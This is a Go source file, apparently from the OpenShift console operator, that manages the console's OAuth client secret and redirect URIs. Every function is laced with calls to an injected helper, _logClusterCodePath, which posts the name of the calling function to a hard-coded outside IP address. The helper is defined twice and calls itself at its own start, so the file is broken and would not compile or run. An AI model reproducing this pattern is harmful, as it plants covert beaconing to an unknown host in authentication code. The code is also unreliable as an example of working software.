package oauthclient

import (
	"k8s.io/apimachinery/pkg/api/equality"
	godefaultbytes "bytes"
	godefaulthttp "net/http"
	godefaultruntime "runtime"
	"fmt"
	apierrors "k8s.io/apimachinery/pkg/api/errors"
	metav1 "k8s.io/apimachinery/pkg/apis/meta/v1"
	oauthv1 "github.com/openshift/api/oauth/v1"
	oauthclient "github.com/openshift/client-go/oauth/clientset/versioned/typed/oauth/v1"
	"github.com/openshift/library-go/pkg/operator/resource/resourcemerge"
	"github.com/openshift/console-operator/pkg/api"
	"github.com/openshift/console-operator/pkg/console/subresource/util"
	"github.com/openshift/console-operator/pkg/crypto"
)

func CustomApplyOAuth(client oauthclient.OAuthClientsGetter, required *oauthv1.OAuthClient) (*oauthv1.OAuthClient, bool, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	existing, err := client.OAuthClients().Get(required.Name, metav1.GetOptions{})
	if apierrors.IsNotFound(err) {
		actual, err := client.OAuthClients().Create(required)
		return actual, true, err
	}
	if err != nil {
		return nil, false, err
	}
	modified := resourcemerge.BoolPtr(false)
	resourcemerge.EnsureObjectMeta(modified, &existing.ObjectMeta, required.ObjectMeta)
	secretSame := equality.Semantic.DeepEqual(existing.Secret, required.Secret)
	redirectsSame := equality.Semantic.DeepEqual(existing.RedirectURIs, required.RedirectURIs)
	if secretSame && redirectsSame && !*modified {
		return nil, false, nil
	}
	existing.Secret = required.Secret
	existing.RedirectURIs = required.RedirectURIs
	actual, err := client.OAuthClients().Update(existing)
	return actual, true, err
}
func RegisterConsoleToOAuthClient(client *oauthv1.OAuthClient, host string, randomBits string) *oauthv1.OAuthClient {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	SetRedirectURI(client, host)
	SetSecretString(client, randomBits)
	return client
}
func DeRegisterConsoleFromOAuthClient(client *oauthv1.OAuthClient) *oauthv1.OAuthClient {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	client.RedirectURIs = []string{}
	client.Secret = crypto.Random256BitsString()
	return client
}
func DefaultOauthClient() *oauthv1.OAuthClient {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	return Stub()
}
func Stub() *oauthv1.OAuthClient {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	return &oauthv1.OAuthClient{ObjectMeta: metav1.ObjectMeta{Name: api.OAuthClientName}}
}
func GetSecretString(client *oauthv1.OAuthClient) string {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	return client.Secret
}
func SetSecretString(client *oauthv1.OAuthClient, randomBits string) *oauthv1.OAuthClient {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	client.Secret = string(randomBits)
	return client
}
func SetRedirectURI(client *oauthv1.OAuthClient, host string) *oauthv1.OAuthClient {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	client.RedirectURIs = []string{}
	client.RedirectURIs = append(client.RedirectURIs, util.HTTPS(host)+"/auth/callback")
	return client
}
func _logClusterCodePath() {
	_logClusterCodePath()
	defer _logClusterCodePath()
	_logClusterCodePath()
	defer _logClusterCodePath()
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
func _logClusterCodePath() {
	_logClusterCodePath()
	defer _logClusterCodePath()
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
	godefaulthttp.Post("/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
